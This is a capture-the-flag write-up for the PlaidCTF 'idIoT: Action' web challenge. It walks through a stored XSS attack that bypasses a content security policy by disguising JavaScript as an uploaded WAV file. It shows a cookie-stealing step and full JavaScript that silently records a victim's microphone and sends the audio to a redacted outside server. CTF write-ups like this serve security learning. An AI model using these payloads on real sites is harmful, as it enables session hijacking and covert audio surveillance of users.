idIoT: Action
=============

PlaidCTF Web 200

Some people won't let any smart devices in their home at all. Some are cautious, do their research, and make an informed decision. This guy falls in neither category; he's a a downright idIoT.

The idIoT uses this service called [clipshare](https://idiot.chal.pwning.xxx/); you can find his account [here](https://idiot.chal.pwning.xxx/user.php?id=3427e48e-a6eb-4323-aed4-3ce4a83d4f46) or [here](https://idiot.chal.pwning.xxx/user.php?id=8660d251-d77c-4316-ac2c-a9a0662e6240) after you make an account.

He was telling me the other day about how he has a Google Home next to his computer running at all times. He also told me that if you ask politely it will tell you the flag. However, while he'll look at anything you share, he closes it almost immediately if he doesn't seem like it'll interest him. Maybe we can look at his clips to find something to match his interests?

(Flag format: PCTF{xxx} where xxx is some text composed of lower-case letters and underscores)

solution
========

TRIGGER ALERT: some people may find many of the variable names and random strings used to be offensive. No harm was meant, but if you are easily triggered, please do not read further. By reading further you consent to reading possible trigger words.

Based on the problem statement, it looks like this problem will be split into two parts:

1. Hack idiot's account
2. Hack idiot's google home using whatever data we get from his account.

Playing around with the site, it looks like it's vulnerable to xss:

![xss screenshot](https://i.imgur.com/r6gkrHh.png)

Unfortunately, our script is blocked from running by the CSP.

![cucked](https://i.imgur.com/Xj1NQrf.png)

We note that CSP states that scripts can only run from `script-src 'self'`. This means that any javascript I use must come from the server itself. But wait a second: we can post audio files to the website? Is it possible that we could use one of these audio files as our javascript source?

After looking over [this](https://steemit.com/ctf/@maniffin/defcamp-ctf-quals-2017-llc-webchall-writeup) writeup from defcamp, where a crafted GIF file was used to bypass CSP, I felt like it would be possible. So we needed to find an acceptable file format that could also be malformed into valid javascript, while remaining a valid audio file. After playing with ogg files for a while, I realized that WAV files would work:

![wow](https://i.imgur.com/tJUUifV.png)

Here, I've modified the WAV's header such that it is still a valid header, but everything is commented out except the initial `RIFF`. Below, after some bytes from the template WAV file I used, I simply close the comment and finish the javascript command by assigning `RIFF` a value as a variable. After that, I can just add a semicolon, and put any javascript code I want!

... Theoretically.

Unfortunately, uploading this file as a `.wav` did not work, since its MIME type was `audio/x-wav` and was not executable.

![sad](https://i.imgur.com/0iplXMP.png)

Attempting to rename the file to other formats, like `.ogg` still allowed me to upload it, but it still had an audio MIME type. But wait: according to [this site](https://www.freeformatter.com/mime-types-list.html), `.wave` has no associated MIME type, but we are still allowed to upload it!

I ended up uploading this payload:

![lol](https://i.imgur.com/zYkro4Q.png)

Note: this immediately redirects the page to my server when you import it, which may make a later step harder. If you want you can change the payload to something else that will still allow you to exfiltrate the cookie. After uploading, 

Next, I simply created a new post with body

```
<script src="https://idiot.chal.pwning.xxx/uploads/upload_5aee08ef0275e0.94993532.wave"></script>
```

Which, when accessed, immediately steals your cookie! Using burp suite, we shared this link with idiot1 and idiot3, and got cookies.

`qwer=bbcgvivohijl6bgjg37jl6g497;%20PHPSESSID=m1on6drcdgjf7q6hdmm7k2vsi1`

I'm not sure what the qwer cookie was, but oh well. Pasting them as my cookies, I am able to auth as idiot1.

![hacked](https://i.imgur.com/5GP98ee.png)

Reading the posts, it seems that the user will only listen to audio if we send `spatulate` in the description, and from the audio clip in `thoughts on google home`, it states that if you say `OK Google, what is the flag` the google home will say the flag.

Now our next attack is to:

1. hack the microphone
2. use our own uploaded audio clip to say "OK google, what is the flag"
3. exfiltrate microphone recorded data to our own server
4. Get flag!

After some google hackery and copy paste skills, I ended up with this javascript code to activate the microphone, record for 20 seconds, converts it into webm format and then into hex, and send it to my teammate's server (which was HTTPS, since mine was only http). The hardest part of this was actually getting the https exfiltration server up and running. Note: I've redacted his url because he didn't want to get doxxed :^).

```javascript
// appends an audio element to playback and download recording
function createAudioElement(blobUrl) {
  var oReq = new XMLHttpRequest();
  oReq.open("GET", blobUrl, true);
  oReq.responseType = "arraybuffer";

  oReq.onload = function (oEvent) {
    var arrayBuffer = oReq.response; // Note: not oReq.responseText
    if (arrayBuffer) {
      var sicedeets = Array.prototype.map.call(new Uint8Array(arrayBuffer), x => ('00' + x.toString(16)).slice(-2)).join('');
      var oreq2 = new XMLHttpRequest();
      oreq2.open("POST", "<redacted>", true);
      oreq2.send(sicedeets);

      /*
      for (var i=0; i<sicedeets.length; i += 10000) {
        var oreq2 = new XMLHttpRequest();
        oreq2.open("POST", "<redacted>", true);
        oreq2.send(i+"_"+sicedeets.slice(i,i+10000));
      }*/

      
    }
  };

  oReq.send(null);
}

// request permission to access audio stream
navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    // store streaming data chunks in array
    const chunks = [];
    // create media recorder instance to initialize recording
    const recorder = new MediaRecorder(stream);
    // function to be called when data is received
    recorder.ondataavailable = e => {
      // add stream data to chunks
      chunks.push(e.data);
      // if recorder is 'inactive' then recording has finished
      if (recorder.state == 'inactive') {
          // convert stream data chunks to a 'webm' audio format as a blob
          const blob = new Blob(chunks, { type: 'audio/webm' });
          // convert blob to URL so it can be assigned to a audio src attribute
          createAudioElement(URL.createObjectURL(blob));
      }
    };
    // start recording with 1 second time between receiving 'ondataavailable' events
    recorder.start(1000);
    // setTimeout to stop recording after 4 seconds
    setTimeout(() => {
        // this will trigger one final 'ondataavailable' event and set recorder state to 'inactive'
        recorder.stop();
    }, 20000);
  }).catch(console.error);
```

Similarly to our previous attack, I paste this into a malformed wave file:

![screenshot](https://i.imgur.com/LEZQ02D.png)

Again, I upload this file, and copy the URL for it. Then, I import it in another post with title and description `spatulate`.

![spatulate](https://i.imgur.com/8SJefql.png)

Next, I share it with idiot1 again, and wait for the data to start rolling in. After receiving the hex data from idiot1's computer, I simply paste the hex into a hex editor and save as a webm file.

![webm deets](https://i.imgur.com/jbfwkUw.png)

Finally, opening the audio and listening to it gives us the flag.

Flag: `pctf{not_so_smart}`
